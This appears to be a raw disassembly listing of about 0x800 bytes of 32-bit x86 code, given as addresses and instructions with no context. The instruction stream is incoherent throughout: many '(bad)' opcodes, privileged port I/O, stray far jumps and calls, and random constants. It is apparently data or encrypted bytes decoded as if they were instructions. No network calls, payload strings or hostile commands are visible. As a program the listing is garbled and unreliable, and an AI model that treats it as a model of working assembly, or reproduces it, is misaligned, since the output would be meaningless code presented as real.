  4127ad:	fcom   QWORD PTR [esi+0x5411f97f]
  4127b3:	mov    al,0x98
  4127b5:	cmp    DWORD PTR [ebx+0x7ecdea6b],edx
  4127bb:	sub    al,0xc9
  4127bd:	jae    0x412802
  4127bf:	push   ss
  4127c0:	sub    BYTE PTR [esi-0x63],0x89
  4127c4:	(bad)  
  4127c5:	jnp    0x41278c
  4127c7:	xor    edi,DWORD PTR [esi-0x708769c7]
  4127cd:	jb     0x41280f
  4127cf:	aaa    
  4127d0:	out    0x1b,eax
  4127d2:	xchg   esi,eax
  4127d3:	inc    eax
  4127d4:	es sti 
  4127d6:	xor    al,0xd8
  4127d8:	or     al,0x6d
  4127da:	or     esi,0x452d06a0
  4127e0:	push   ss
  4127e1:	sub    esp,DWORD PTR [eax]
  4127e3:	xchg   edi,eax
  4127e4:	add    al,0x85
  4127e6:	mov    cl,0x4e
  4127e8:	mov    BYTE PTR ds:0x7a6599d0,al
  4127ee:	pop    esp
  4127ef:	sub    eax,0x20de23eb
  4127f4:	ins    DWORD PTR es:[edi],dx
  4127f5:	xor    BYTE PTR [eax+0x37383929],bh
  4127fb:	add    DWORD PTR [edx+0x4db4c469],edi
  412801:	add    esp,DWORD PTR [edi-0x7a]
  412804:	std    
  412805:	or     ebp,DWORD PTR [esi+0x58]
  412808:	jbe    0x41279e
  41280a:	add    al,0xe2
  41280c:	pop    edi
  41280d:	loope  0x4127b9
  41280f:	(bad)  
  412810:	cld    
  412811:	data16 out 0x78,al
  412814:	add    DWORD PTR [ecx],ebp
  412816:	or     DWORD PTR [ecx],esi
  412818:	sti    
  412819:	outs   dx,DWORD PTR ds:[esi]
  41281a:	jb     0x412816
  41281c:	test   eax,0x9da6edb9
  412821:	int    0x6c
  412823:	dec    ebx
  412824:	jo     0x4128a1
  412826:	fdivr  QWORD PTR [esp+ebx*1]
  412829:	inc    ebx
  41282a:	test   al,0x60
  41282c:	mov    esp,0x2ecb09be
  412831:	add    cl,ah
  412833:	pop    ecx
  412834:	cld    
  412835:	(bad)  
  412836:	pop    ds
  412837:	inc    ebp
  412838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412839:	repnz pop ebx
  41283b:	xchg   ebx,eax
  41283c:	fnstenv [esp+edi*8-0x2585bb38]
  412843:	dec    ebp
  412844:	xchg   esp,eax
  412845:	sbb    eax,0xccda4edd
  41284a:	shr    DWORD PTR [eax-0xdbd419f],cl
  412850:	or     eax,0x22fe8ea7
  412855:	xchg   ebx,eax
  412856:	pop    es
  412857:	dec    esp
  412858:	(bad)  
  412859:	mov    dl,0xee
  41285b:	adc    ch,BYTE PTR [ecx-0x1e9bda5a]
  412861:	push   esi
  412862:	ret    
  412863:	dec    esp
  412864:	sbb    BYTE PTR [esi],dl
  412866:	je     0x41282d
  412868:	aas    
  412869:	push   0xb792f89b
  41286e:	clc    
  41286f:	jecxz  0x41289b
  412871:	and    eax,0x450b41ab
  412876:	pop    ebx
  412877:	mov    ds:0xb281d5f6,al
  41287c:	or     eax,0x3c54e125
  412881:	jg     0x412852
  412883:	jae    0x412837
  412885:	adc    edi,DWORD PTR [esi-0x1b]
  412888:	inc    eax
  412889:	lahf   
  41288a:	lods   eax,DWORD PTR ds:[esi]
  41288b:	jns    0x412888
  41288d:	sub    al,0xb9
  41288f:	stc    
  412890:	fisttp WORD PTR [ebp-0x1b7ccad6]
  412896:	ret    0x46d8
  412899:	retf   
  41289a:	mov    cl,0xeb
  41289c:	bound  esp,QWORD PTR [ebx+eax*4+0x48]
  4128a0:	or     DWORD PTR [esi+0x5f],ebp
  4128a3:	fld    st(4)
  4128a5:	in     al,0xe1
  4128a7:	pushf  
  4128a8:	into   
  4128a9:	into   
  4128aa:	jl     0x412913
  4128ac:	add    al,0x99
  4128ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128af:	push   ebx
  4128b0:	cwde   
  4128b1:	cdq    
  4128b2:	xchg   ecx,eax
  4128b3:	out    dx,al
  4128b4:	sbb    cl,BYTE PTR [edi+0x5ef89268]
  4128ba:	stos   DWORD PTR es:[edi],eax
  4128bb:	clc    
  4128bc:	push   ecx
  4128bd:	mov    ebx,0xc4e1d53c
  4128c2:	loope  0x412940
  4128c4:	sbb    DWORD PTR [eax+0x7d],esi
  4128c7:	pusha  
  4128c8:	lea    esp,gs:0x997af45b
  4128cf:	jecxz  0x41290b
  4128d1:	mov    ebp,0x8af74b62
  4128d6:	ret    0x1fff
  4128d9:	xchg   DWORD PTR ds:0xcbcd3d6a,eax
  4128df:	pop    ebx
  4128e0:	xor    al,0x86
  4128e2:	jb     0x412921
  4128e4:	adc    BYTE PTR [ebx-0x6883c65d],dh
  4128ea:	lock sysenter 
  4128ed:	xchg   ebp,eax
  4128ee:	mov    esp,0x3d1197a2
  4128f3:	outs   dx,DWORD PTR ds:[esi]
  4128f4:	(bad)  
  4128f5:	jmp    0x1d0759c8
  4128fa:	cwde   
  4128fb:	retf   0xc58f
  4128fe:	fnstsw WORD PTR [esi+edx*4-0x76442b0f]
  412905:	daa    
  412906:	inc    esp
  412907:	dec    eax
  412908:	(bad)  
  412909:	pop    edx
  41290a:	mov    edx,eax
  41290c:	push   esi
  41290d:	add    ah,BYTE PTR [esi]
  41290f:	jge    0x4128e0
  412911:	or     BYTE PTR [edx-0x59b7ba6],dl
  412917:	inc    esi
  412918:	xor    dh,bh
  41291a:	cmp    al,al
  41291c:	push   ecx
  41291d:	mov    eax,0x74bd1098
  412922:	in     al,dx
  412923:	sub    DWORD PTR [edi+esi*8+0x2a],edi
  412927:	sbb    BYTE PTR [ecx],cl
  412929:	pop    ss
  41292a:	test   esp,esi
  41292c:	mov    ebp,0xa0a707e8
  412931:	outs   dx,BYTE PTR ds:[esi]
  412932:	or     al,0x35
  412934:	push   es
  412935:	dec    esi
  412936:	fs add edi,edi
  412939:	push   0x8c939043
  41293e:	mov    edi,0x4d7f6cf7
  412943:	push   ebp
  412944:	mov    esp,0x82100446
  412949:	dec    ebx
  41294a:	jns    0x4128dd
  41294c:	aad    0x8e
  41294e:	mov    ebx,0xf8199127
  412953:	cli    
  412954:	cli    
  412955:	sbb    edx,ebx
  412957:	adc    BYTE PTR [ebp+0x78],bh
  41295a:	inc    ebp
  41295b:	or     al,0x7a
  41295d:	jle    0x412951
  41295f:	mov    dl,BYTE PTR [ecx]
  412961:	(bad)  
  412962:	in     eax,dx
  412963:	iret   
  412964:	(bad)  
  412966:	(bad)  
  412967:	shl    BYTE PTR ds:0x200f6e66,1
  41296d:	retf   0x329b
  412970:	aad    0x8d
  412972:	aam    0xbf
  412974:	call   0xe37ec5ca
  412979:	in     eax,0x22
  41297b:	loope  0x412919
  41297d:	pop    ecx
  41297e:	jmp    0x41299e
  412980:	jne    0x4129a2
  412982:	daa    
  412983:	shl    BYTE PTR [esi+ecx*8-0x41074941],cl
  41298a:	dec    DWORD PTR [edx-0x368e7461]
  412990:	adc    eax,0xb88c6a16
  412995:	mov    ecx,0x244e722f
  41299b:	loopne 0x412963
  41299d:	jp     0x4129ae
  41299f:	adc    ebx,ecx
  4129a1:	es (bad) 
  4129a3:	fucomip st,st(7)
  4129a5:	(bad)  
  4129a6:	int    0xc1
  4129a8:	hlt    
  4129a9:	rcl    DWORD PTR [esi+0x46],1
  4129ac:	into   
  4129ad:	ret    
  4129ae:	out    dx,eax
  4129af:	pop    edx
  4129b0:	or     BYTE PTR [ecx],al
  4129b2:	jecxz  0x412976
  4129b4:	mov    edx,0xf9b8341d
  4129b9:	and    al,0x6a
  4129bb:	data16 daa 
  4129bd:	call   0x3d2e9f02
  4129c2:	(bad)  
  4129c4:	call   DWORD PTR [ecx-0x2a]
  4129c7:	pop    ebp
  4129c8:	lds    esp,FWORD PTR [esi+0x58]
  4129cb:	ins    BYTE PTR es:[edi],dx
  4129cc:	adc    BYTE PTR [ecx+0x67c28c1a],ch
  4129d2:	inc    edx
  4129d3:	jnp    0x412a1e
  4129d5:	push   esp
  4129d6:	test   eax,0x699dee1a
  4129db:	sbb    edi,DWORD PTR [esi+ecx*4+0x3a]
  4129df:	jmp    0xc60b44c0
  4129e4:	out    dx,eax
  4129e5:	pop    es
  4129e6:	fld    st(6)
  4129e8:	pop    ebp
  4129e9:	mov    ds,WORD PTR [ecx+0x77]
  4129ec:	les    ebx,FWORD PTR [ebx]
  4129ee:	adc    bl,0xbb
  4129f1:	sub    cl,BYTE PTR [ebx+0x6017b723]
  4129f7:	add    al,0xf2
  4129f9:	cs out dx,eax
  4129fb:	mov    ebp,0xadd2e268
  412a00:	(bad)  
  412a01:	inc    ebx
  412a02:	loope  0x4129db
  412a04:	call   0x4c96:0x72eec410
  412a0b:	cmp    eax,0x1aa8114b
  412a10:	cdq    
  412a11:	jne    0x412a4b
  412a13:	popf   
  412a14:	enter  0x76c5,0x91
  412a18:	in     eax,0xa6
  412a1a:	xchg   ebp,eax
  412a1b:	dec    eax
  412a1c:	int    0x2f
  412a1e:	das    
  412a1f:	adc    eax,DWORD PTR [ecx-0x78675c0d]
  412a25:	ins    DWORD PTR es:[edi],dx
  412a26:	and    al,0xc9
  412a28:	outs   dx,BYTE PTR ds:[esi]
  412a29:	mov    eax,0x7fe3b25d
  412a2e:	(bad)  
  412a30:	aam    0x37
  412a32:	xor    DWORD PTR [eax-0x64],edi
  412a35:	pusha  
  412a36:	mov    ds:0x48c681cd,al
  412a3b:	or     DWORD PTR [edx-0x34951aa2],ecx
  412a41:	push   ecx
  412a42:	sbb    al,al
  412a44:	ins    BYTE PTR es:[edi],dx
  412a45:	pop    ds
  412a46:	add    ecx,ebx
  412a48:	or     BYTE PTR [eax-0x35],bl
  412a4b:	mov    edx,0xb7ccff5f
  412a50:	aam    0x82
  412a52:	add    eax,0x479a8608
  412a57:	ret    0x1f3
  412a5a:	cmc    
  412a5b:	jg     0x412a55
  412a5d:	gs sub al,0xbf
  412a60:	mov    al,ds:0x260c8bd
  412a65:	ja     0x412a77
  412a67:	inc    ebx
  412a68:	inc    eax
  412a69:	test   eax,0xfeab2808
  412a6e:	cmp    cl,al
  412a70:	iret   
  412a71:	pop    edi
  412a72:	xchg   BYTE PTR [esi-0x44900998],bh
  412a78:	xor    al,0x84
  412a7a:	dec    edx
  412a7b:	or     al,al
  412a7d:	pop    ds
  412a7e:	outs   dx,DWORD PTR ds:[esi]
  412a7f:	clc    
  412a80:	ja     0x412a02
  412a82:	pusha  
  412a83:	nop
  412a84:	scas   eax,DWORD PTR es:[edi]
  412a85:	xor    al,0x25
  412a87:	push   edi
  412a88:	fcomi  st,st(7)
  412a8a:	mov    eax,0x7587ebd4
  412a8f:	jmp    0x32d2:0x9d1eaae8
  412a96:	fcomp  QWORD PTR [esi+0x3599b286]
  412a9c:	call   0x81ca20f3
  412aa1:	push   ebx
  412aa2:	rcl    ecx,cl
  412aa4:	outs   dx,DWORD PTR ds:[esi]
  412aa5:	xchg   esi,eax
  412aa6:	dec    edx
  412aa7:	repnz lods eax,DWORD PTR fs:[esi]
  412aaa:	loop   0x412a33
  412aac:	or     eax,0x77420a3b
  412ab1:	jmp    0x412ad5
  412ab3:	add    al,0x92
  412ab5:	sub    al,BYTE PTR [esi]
  412ab7:	sbb    BYTE PTR ds:0x9e4c0569,al
  412abd:	fadd   QWORD PTR [edi+0x40]
  412ac0:	jle    0x412b2e
  412ac2:	mov    BYTE PTR [ebp+eax*1+0x10],0xd
  412ac7:	iret   
  412ac8:	pop    ss
  412ac9:	(bad)  
  412aca:	and    ah,BYTE PTR [ecx+edi*2]
  412acd:	jo     0x412ae3
  412acf:	ins    DWORD PTR es:[edi],dx
  412ad0:	push   eax
  412ad1:	icebp  
  412ad2:	xor    BYTE PTR [esi+esi*4+0x6d606e39],0xc2
  412ada:	retf   
  412adb:	ss enter 0x45ac,0x3
  412ae0:	(bad)  
  412ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ae2:	retf   
  412ae3:	in     eax,0xfc
  412ae5:	sub    bl,BYTE PTR [edx-0x474ad504]
  412aeb:	sti    
  412aec:	repz clc 
  412aee:	mov    dh,0x70
  412af0:	or     ebx,DWORD PTR [edi-0xd]
  412af3:	out    0xc6,al
  412af5:	dec    ebx
  412af6:	retf   
  412af7:	pop    esp
  412af8:	pop    ebp
  412af9:	xchg   ebx,eax
  412afa:	sub    DWORD PTR ds:0xced51182,ebp
  412b00:	inc    esp
  412b01:	add    edx,eax
  412b03:	ficomp DWORD PTR [esi+0x78a49aba]
  412b09:	sti    
  412b0a:	lahf   
  412b0b:	retf   0x5877
  412b0e:	push   cs
  412b0f:	push   ebp
  412b10:	dec    ecx
  412b11:	pop    edx
  412b12:	rcl    BYTE PTR [eax-0x38],0x6f
  412b16:	adc    DWORD PTR [esi-0x790535d6],ebx
  412b1c:	or     esi,DWORD PTR [esi-0x4c]
  412b1f:	inc    esp
  412b20:	mov    ebp,0xd987865f
  412b25:	sbb    eax,0xe623a047
  412b2a:	sub    eax,0x22c5cda2
  412b2f:	xor    edi,0xffffff95
  412b32:	imul   esp,DWORD PTR [esi-0x591d35f3],0x43
  412b39:	lahf   
  412b3a:	or     al,0x58
  412b3c:	in     al,dx
  412b3d:	add    dl,cl
  412b3f:	iret   
  412b40:	lock loop 0x412af7
  412b43:	mov    ebx,0x7dc72013
  412b48:	sar    BYTE PTR [ebp+0x29b82041],0xc
  412b4f:	leave  
  412b50:	push   ds
  412b51:	push   es
  412b52:	and    eax,0x923f6593
  412b57:	jnp    0x412b27
  412b59:	shl    esp,0xd
  412b5c:	or     al,0xcb
  412b5e:	(bad)  
  412b5f:	mov    ebp,0x18d3f4b0
  412b65:	dec    edi
  412b66:	imul   ebp,ebp,0x2529e1c8
  412b6c:	xchg   esp,eax
  412b6d:	mov    ds:0x679de8d4,al
  412b72:	outs   dx,BYTE PTR ds:[esi]
  412b73:	fisub  WORD PTR [edx-0x48]
  412b76:	cdq    
  412b77:	mov    ds:0xe448d835,eax
  412b7c:	retf   
  412b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b7e:	sub    DWORD PTR [edx+ebx*1],esi
  412b81:	test   BYTE PTR ds:0xc96a0c2b,0x55
  412b88:	neg    BYTE PTR [ecx]
  412b8a:	cmp    ch,dh
  412b8c:	into   
  412b8d:	xor    DWORD PTR [esi+esi*4+0x59],edx
  412b91:	adc    DWORD PTR [esi],0xe45e8ea9
  412b97:	push   edx
  412b98:	call   FWORD PTR [ebp-0x49ad78e8]
  412b9e:	aaa    
  412b9f:	lods   eax,DWORD PTR ds:[esi]
  412ba0:	adc    bl,ah
  412ba2:	push   0xa9fd5f1f
  412ba7:	sub    bl,BYTE PTR [edx-0x7d]
  412baa:	retf   0xecec
  412bad:	jmp    0xc743773a
  412bb2:	into   
  412bb3:	sbb    eax,0xf6b6ccfe
  412bb8:	in     eax,dx
  412bb9:	add    BYTE PTR [ebp-0x1f],ah
  412bbc:	fild   QWORD PTR [edx+0x45]
  412bbf:	sbb    al,0x6c
  412bc1:	mov    edx,0xf7cf77a3
  412bc6:	mov    ebx,0x8e39b4bb
  412bcb:	push   esi
  412bcc:	ret    
  412bcd:	push   edx
  412bce:	and    eax,0x143d68f2
  412bd3:	mov    eax,0x78e33b26
  412bd8:	cmc    
  412bd9:	xor    BYTE PTR [eax+edx*4],al
  412bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bdd:	push   ecx
  412bde:	dec    eax
  412bdf:	xchg   ecx,eax
  412be0:	add    ebp,DWORD PTR ds:0x9b42dbfc
  412be6:	or     dl,BYTE PTR [edi+0x21562ca4]
  412bec:	jg     0x412b81
  412bee:	loop   0x412bbe
  412bf0:	push   ss
  412bf1:	lahf   
  412bf2:	mov    ds:0x89a31ea8,al
  412bf7:	mov    bl,0x5e
  412bf9:	inc    ebx
  412bfa:	or     al,0x2d
  412bfd:	add    BYTE PTR [edi-0x61f92269],bh
  412c03:	scas   al,BYTE PTR es:[edi]
  412c04:	stos   BYTE PTR es:[edi],al
  412c05:	mov    edx,0xe749f1a
  412c0a:	pop    eax
  412c0b:	aad    0x1e
  412c0d:	xor    BYTE PTR [eax-0xb],ah
  412c10:	jmp    0x412c53
  412c12:	leave  
  412c13:	mov    ebx,0xa20eed6c
  412c18:	jae    0x412bde
  412c1a:	out    dx,eax
  412c1b:	cwde   
  412c1c:	mov    ds:0x56850428,al
  412c21:	adc    ebp,edx
  412c23:	repz mov bh,0x5
  412c26:	inc    ecx
  412c27:	loopne 0x412bd5
  412c29:	(bad)  
  412c2a:	and    al,0x36
  412c2c:	push   ecx
  412c2d:	mov    ch,0xde
  412c2f:	ds xor eax,0x267d50a7
  412c35:	pop    ebx
  412c36:	jl     0x412cb2
  412c38:	inc    ecx
  412c39:	xchg   ebx,eax
  412c3a:	push   ecx
  412c3b:	adc    BYTE PTR [edx+0x70],bl
  412c3e:	jmp    0xafb7fd3d
  412c43:	mov    esi,0x8ab1995c
  412c48:	imul   bp,WORD PTR [esi-0x4b0c8e45],0xe25c
  412c51:	(bad)  [ebx+0x76628807]
  412c57:	mov    bl,0xb3
  412c59:	pop    esi
  412c5a:	jmp    0xdf3c:0xe49eb2f5
  412c61:	cmp    ch,BYTE PTR [edi-0x2cf8f20f]
  412c67:	cmc    
  412c68:	xchg   ebp,eax
  412c69:	rcr    BYTE PTR [eax],cl
  412c6b:	es sti 
  412c6d:	cld    
  412c6e:	jno    0x412c06
  412c70:	sub    eax,esp
  412c72:	(bad)  
  412c73:	push   ebx
  412c74:	int3   
  412c75:	fs inc ebx
  412c77:	pop    esp
  412c78:	dec    edx
  412c79:	mov    edi,0x904ec489
  412c7e:	add    edi,ebx
  412c80:	(bad)
  412c84:	push   0x76
  412c86:	pop    esi
  412c87:	mov    esi,0x4344e209
  412c8c:	mov    ds:0xd4c3e71,al
  412c91:	mov    edx,0x163f451a
  412c96:	add    bl,BYTE PTR [esi]
  412c98:	xchg   esi,eax
  412c99:	fwait
  412c9a:	arpl   sp,di
  412c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c9d:	sbb    bl,BYTE PTR [ecx-0x6dcb0e23]
  412ca3:	mov    cl,bl
  412ca5:	dec    ecx
  412ca6:	stos   DWORD PTR es:[edi],eax
  412ca7:	sub    ebp,DWORD PTR [ecx+eax*8-0x76]
  412cab:	test   eax,0x878cdbb2
  412cb0:	sbb    al,0x30
  412cb2:	nop
  412cb3:	pop    esp
  412cb4:	stc    
  412cb5:	pusha  
  412cb6:	add    al,0xfe
  412cb8:	push   ebp
  412cb9:	mov    ebx,0xec79591b
  412cbe:	(bad)  
  412cbf:	mov    al,0x1d
  412cc1:	aad    0x7e
  412cc3:	in     al,dx
  412cc4:	loopne 0x412c93
  412cc6:	nop
  412cc7:	retf   
  412cc8:	inc    esi
  412cc9:	out    0x62,eax
  412ccb:	add    BYTE PTR [edi+ecx*2],dh
  412cce:	addr16 sub al,0xa7
  412cd1:	fist   WORD PTR [edx-0x70]
  412cd4:	push   ebx
  412cd5:	dec    ebp
  412cd6:	jnp    0x412d05
  412cd8:	mov    edx,0x6e31d93a
  412cdd:	push   ss
  412cde:	and    edx,DWORD PTR [ebx]
  412ce0:	test   eax,0xfbcd944b
  412ce5:	adc    ecx,edi
  412ce7:	test   eax,0xd8b5d886
  412cec:	push   es
  412ced:	mov    bl,bl
  412cef:	push   eax
  412cf0:	mov    ecx,0xe1c0cffb
  412cf5:	out    0x79,al
  412cf7:	push   es
  412cf8:	sar    BYTE PTR [edi+0x47],cl
  412cfb:	loop   0x412c91
  412cfd:	fidivr WORD PTR [ecx-0x4b9df1da]
  412d03:	jg     0x412d43
  412d05:	sbb    esp,eax
  412d07:	fldenv [eax+0x4e1b7302]
  412d0d:	or     al,0x56
  412d0f:	mov    esi,0xb3b1e5a7
  412d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d15:	push   ss
  412d16:	or     eax,0xdf8f008e
  412d1b:	movzx  esi,BYTE PTR [esi-0x149a50b2]
  412d22:	jmp    0x412d55
  412d24:	xchg   ebx,eax
  412d25:	cs sahf 
  412d27:	mov    ds:0x57ebf405,eax
  412d2c:	loopne 0x412d38
  412d2e:	adc    dl,BYTE PTR ds:0xa1a7860b
  412d34:	pushf  
  412d35:	add    dl,cl
  412d37:	arpl   WORD PTR [ecx-0x31592028],sp
  412d3d:	sub    esi,DWORD PTR [ecx-0xd]
  412d40:	inc    edi
  412d41:	(bad)  
  412d42:	(bad)  
  412d43:	mul    BYTE PTR [esi+0x60208c5a]
  412d49:	pop    ecx
  412d4a:	mov    eax,ds:0x959eb1a9
  412d4f:	ret    0x47f4
  412d52:	cld    
  412d53:	dec    ecx
  412d54:	in     al,0xd0
  412d56:	fistp  QWORD PTR [ebp+0x6d09561c]
  412d5c:	ins    BYTE PTR es:[edi],dx
  412d5d:	loop   0x412d8a
  412d5f:	loopne 0x412d42
  412d61:	dec    ebp
  412d62:	ins    DWORD PTR es:[edi],dx
  412d63:	mov    cs,WORD PTR [edx+0x6f92db48]
  412d69:	fdiv   DWORD PTR [ebx]
  412d6b:	mov    bl,0xf3
  412d6d:	cmp    al,0x80
  412d6f:	cmp    eax,0xfb77b7d5
  412d74:	dec    ecx
  412d75:	inc    eax
  412d76:	stos   DWORD PTR es:[edi],eax
  412d77:	adc    al,0xae
  412d79:	xor    BYTE PTR [ecx+0x5482023d],0xc7
  412d80:	inc    eax
  412d81:	push   ds
  412d82:	inc    ecx
  412d83:	mov    al,ds:0xbfc26356
  412d88:	aas    
  412d89:	outs   dx,DWORD PTR ds:[esi]
  412d8a:	loopne 0x412db1
  412d8c:	mov    cl,0x7c
  412d8e:	xlat   BYTE PTR ds:[ebx]
  412d8f:	dec    esi
  412d90:	sub    ch,dh
  412d92:	aam    0x15
  412d94:	neg    DWORD PTR [edx+edx*2-0x7]
  412d98:	lahf   
  412d99:	outs   dx,DWORD PTR ds:[esi]
  412d9a:	pusha  
  412d9b:	mov    dl,ah
  412d9d:	jg     0x412de0
  412d9f:	call   0x55a8:0x74a5736b
  412da6:	in     eax,dx
  412da7:	cmp    bh,BYTE PTR [edi]
  412da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412daa:	fidiv  DWORD PTR [edx-0x1fafc1c5]
  412db0:	dec    edx
  412db1:	dec    edi
  412db2:	mov    WORD PTR [edi-0x62a912ce],?
  412db8:	sbb    DWORD PTR [ebx-0x2b32bfc8],eax
  412dbe:	sbb    ebp,0xfec26f12
  412dc4:	cmp    eax,0x9630b155
  412dc9:	cwde   
  412dca:	sub    al,0x79
  412dcc:	jns    0x412e1e
  412dce:	mov    edx,edx
  412dd0:	mov    cs,WORD PTR [ecx-0x38]
  412dd3:	in     eax,0xe0
  412dd5:	ret    
  412dd6:	loope  0x412d7b
  412dd8:	dec    esi
  412dd9:	ss adc al,0x65
  412ddc:	push   ecx
  412ddd:	pop    edi
  412dde:	adc    ecx,DWORD PTR [esi-0x43]
  412de1:	ror    esp,cl
  412de3:	jo     0x412d89
  412de5:	outs   dx,DWORD PTR ds:[esi]
  412de6:	or     esp,DWORD PTR [esi-0x1e764d75]
  412dec:	jne    0x412dd3
  412dee:	loopne 0x412e53
  412df0:	push   eax
  412df1:	popa   
  412df2:	mov    eax,ebp
  412df4:	jp     0x412e00
  412df6:	jae    0x412df6
  412df8:	xchg   ecx,eax
  412df9:	ins    BYTE PTR es:[edi],dx
  412dfa:	outs   dx,BYTE PTR ds:[esi]
  412dfb:	test   eax,0x3f84f345
  412e00:	test   al,0xd7
  412e02:	mov    al,ds:0xf2dad0c
  412e07:	pop    esi
  412e08:	mul    BYTE PTR [esi+0x79207eb0]
  412e0e:	iret   
  412e0f:	jl     0x412de5
  412e11:	xchg   ebx,eax
  412e12:	mov    DWORD PTR [eax+ebx*1+0x4d6b56ec],ecx
  412e19:	popa   
  412e1a:	add    eax,0xf5c462f0
  412e1f:	sbb    al,0xbd
  412e21:	xchg   BYTE PTR [edx+0x75],dh
  412e24:	adc    al,BYTE PTR ds:0x39ef5a09
  412e2b:	jmp    0x3bba:0xb3a7953f
  412e32:	jne    0x412e75
  412e34:	repnz mov esp,0x358e7e9f
  412e3a:	mov    ebp,DWORD PTR [esi]
  412e3c:	iret   
  412e3d:	add    edi,edx
  412e3f:	lock cmp eax,0xa648d8fc
  412e45:	mov    edx,DWORD PTR [ecx]
  412e47:	shl    BYTE PTR [ebx],cl
  412e49:	mov    eax,0xd9a015e6
  412e4e:	nop
  412e4f:	in     al,0xc5
  412e51:	fild   DWORD PTR [edx]
  412e53:	repz xor ebx,DWORD PTR [ecx]
  412e56:	test   al,0x28
  412e58:	jns    0x412e91
  412e5a:	cld    
  412e5b:	mov    ch,0x68
  412e5d:	cli    
  412e5e:	imul   edi,DWORD PTR [edx-0x1e],0xffffff86
  412e62:	lahf   
  412e63:	mov    bh,0xbd
  412e65:	imul   esi,DWORD PTR [ebp-0x23b7ed03],0x33
  412e6c:	sahf   
  412e6d:	fld    DWORD PTR [edi]
  412e6f:	in     eax,0x71
  412e71:	fwait
  412e72:	js     0x412e37
  412e74:	sbb    ah,0x99
  412e77:	retf   0x7878
  412e7a:	pop    esp
  412e7b:	mov    ch,0x56
  412e7d:	div    DWORD PTR [eax-0xf36aed0]
  412e83:	xchg   ebp,eax
  412e84:	dec    ecx
  412e85:	push   0x78
  412e87:	push   esi
  412e88:	push   ebx
  412e89:	imul   eax,DWORD PTR [eax-0x52],0x0
  412e8d:	and    eax,edx
  412e8f:	adc    BYTE PTR [esi-0x56],ah
  412e92:	and    eax,0x74c0197a
  412e97:	xchg   ecx,eax
  412e98:	aam    0x4
  412e9a:	or     ecx,DWORD PTR [ebp+0x67]
  412e9d:	and    dh,BYTE PTR [edi+0x35]
  412ea0:	inc    eax
  412ea1:	pop    ebp
  412ea2:	mov    esp,0x9331bdf9
  412ea7:	lock mov ecx,0x1c36facc
  412ead:	mov    esi,0x80640872
  412eb2:	push   0xffffffd3
  412eb4:	out    0xf5,al
  412eb6:	xor    BYTE PTR [eax+edx*4+0x7f8d5c6f],ah
  412ebd:	cdq    
  412ebe:	ds cmp al,0x7
  412ec1:	xor    dh,dl
  412ec3:	out    dx,al
  412ec4:	pop    ss
  412ec5:	push   ebx
  412ec6:	dec    edi
  412ec7:	sub    BYTE PTR [eax],ch
  412ec9:	sbb    al,0x39
  412ecb:	ins    DWORD PTR es:[edi],dx
  412ecc:	dec    edi
  412ecd:	imul   ebp,DWORD PTR [edx+eiz*2-0x27],0xf9bdf3fb
  412ed5:	adc    al,0x47
  412ed7:	add    dh,BYTE PTR [edi]
  412ed9:	inc    esp
  412eda:	jle    0x412e82
  412edc:	mov    dl,0xa0
  412ede:	in     eax,dx
  412edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ee0:	sub    al,0x18
  412ee2:	shl    BYTE PTR [edi+0x3e6cc9b0],0xb3
  412ee9:	and    ah,BYTE PTR [eax]
  412eeb:	icebp  
  412eec:	xchg   ecx,eax
  412eed:	or     DWORD PTR [ecx-0x26a75994],0x83a89333
  412ef7:	xor    al,BYTE PTR [edx]
  412ef9:	adc    ch,BYTE PTR [edi+0x3bd10d76]
  412eff:	repz xor eax,0x7dde5bea
  412f05:	rcl    ah,1
  412f07:	test   BYTE PTR [edx],bl
  412f09:	add    ebp,DWORD PTR [esi+eax*8-0x6f14c3b4]
  412f10:	fdivrp st(2),st
  412f12:	jae    0x412ed0
  412f14:	cmp    eax,0x6f18d0f5
  412f19:	out    dx,al
  412f1a:	cs adc al,0xa9
  412f1d:	lods   al,BYTE PTR es:[esi]
  412f1f:	cmp    esi,DWORD PTR [edx-0x12]
  412f22:	gs aam 0xc5
  412f25:	aaa    
  412f26:	and    BYTE PTR [eax-0x3],bl
  412f29:	sti    
  412f2a:	push   0x30
  412f2c:	pop    ebp
  412f2d:	pop    es
  412f2e:	xchg   esi,eax
  412f2f:	nop
  412f30:	adc    eax,0xe9ae12b8
  412f35:	(bad)  
  412f38:	mov    al,ds:0xd039ea06
  412f3d:	mov    dh,BYTE PTR [ebp-0x519aff4]
  412f43:	js     0x412f42
  412f45:	pop    ebp
  412f46:	shr    si,1
  412f49:	ja     0x412f45
  412f4b:	xchg   ebp,eax
  412f4c:	sbb    edx,ecx
  412f4e:	add    eax,0x6433fede
  412f53:	or     eax,0x6dc99ae9
  412f58:	outs   dx,BYTE PTR ds:[esi]
  412f59:	dec    ebx
  412f5a:	inc    eax
  412f5b:	div    DWORD PTR [esi+0x3480b5a5]
  412f61:	jae    0x412f67
  412f63:	inc    eax
  412f64:	mov    ebp,0xce9ea256
  412f69:	into   
  412f6a:	mov    eax,ds:0x24570adb
  412f6f:	mov    edx,0x4cd324e2
  412f74:	jle    0x412f3c
  412f76:	mov    esp,0x1c024cdf
  412f7b:	or     BYTE PTR [edi+0xb],bl
  412f7e:	daa    
  412f7f:	and    eax,0x2646f602
  412f84:	(bad)  
  412f87:	jno    0x412fbc
  412f89:	pop    eax
  412f8a:	pop    ds
  412f8b:	dec    esp
  412f8c:	sbb    bh,bl
  412f8e:	out    dx,eax
  412f8f:	pop    ebp
  412f90:	cmp    BYTE PTR [edi],bh
  412f92:	dec    ebp
  412f93:	jmp    0x412f38
  412f95:	shl    ebp,cl
  412f97:	mov    al,ds:0xe192d692
  412f9c:	ds in  eax,dx
  412f9e:	and    esp,DWORD PTR [ecx]
  412fa0:	retf   
  412fa1:	test   eax,0x9956f999
  412fa6:	clc    
  412fa7:	mov    dh,0x96
  412fa9:	loope  0x412f38
  412fab:	mov    ds:0xb5466b18,al
  412fb0:	push   edi
  412fb1:	inc    eax
  412fb2:	scas   al,BYTE PTR es:[edi]
  412fb3:	pop    ebp
